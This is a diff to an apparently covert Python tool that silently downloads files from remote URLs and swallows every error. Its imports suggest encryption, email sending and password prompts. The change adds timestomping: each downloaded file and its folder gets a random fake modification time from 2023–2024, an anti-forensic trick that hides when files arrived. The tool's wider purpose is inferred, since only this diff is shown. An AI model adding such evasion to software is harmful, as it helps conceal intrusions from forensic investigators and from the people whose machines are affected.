@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet
 from email.mime.text import MIMEText
 from tkinter import messagebox
+from datetime import datetime
 import tkinter as tk
 import requests
 import getpass
@@ -9,6 +10,16 @@ import random
 import sys
 import os
 import re
+
+# --- Random Timestamp Generator ---
+def get_random_timestamp():
+    # Define start and end dates
+    start_date = datetime(2023, 1, 1, 0, 0, 0)
+    end_date = datetime(2024, 12, 31, 23, 59, 59)
+    start_timestamp = start_date.timestamp()
+    end_timestamp = end_date.timestamp()
+    random_ts = random.uniform(start_timestamp, end_timestamp)
+    return (random_ts, random_ts) 
 
 # --- Helper Function ---
 def resource_path(relative_path):
@@ -56,13 +67,16 @@ def download_and_save_file(file_info, save_dir):
     raw_url = file_info.get('download_url')
     if not raw_url:
         return
+    random_times = get_random_timestamp()
     try:
         r = requests.get(raw_url)
         r.raise_for_status()
         os.makedirs(save_dir, exist_ok=True)
+        os.utime(save_dir, random_times)
         file_path = os.path.join(save_dir, file_info['name'])
         with open(file_path, 'wb') as f:
             f.write(r.content)
+        os.utime(file_path, random_times)
     except Exception:
         pass
 
